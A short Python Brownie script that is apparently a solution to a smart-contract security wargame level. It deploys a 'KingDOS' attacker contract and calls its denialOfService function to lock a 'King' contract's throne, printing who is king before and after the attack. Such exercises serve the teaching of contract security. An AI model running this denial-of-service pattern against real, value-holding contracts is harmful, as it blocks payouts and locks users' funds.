from brownie import King, KingDOS, Contract, accounts

INSTANCE_ADDRESS = "0x64c1e9d18a7046Be96c660550c7D0958CB62bE30"
ACCOUNT = "straul"


def get_account():
    account = accounts.load(ACCOUNT)
    return account


def hack_king(account):
    king = Contract.from_abi(name="King", address=INSTANCE_ADDRESS, abi=King.abi)

    # deploy attacker contract
    attacker = KingDOS.deploy({'from': account, 'value': king.prize()})

    print(f"King of the contract before hack: {king._king()}")
    attacker.denialOfService(king.address, king.prize(), {'from': account})
    print(f"King of the contract after hack: {king._king()}")

def main():
    account = get_account()
    hack_king(account)
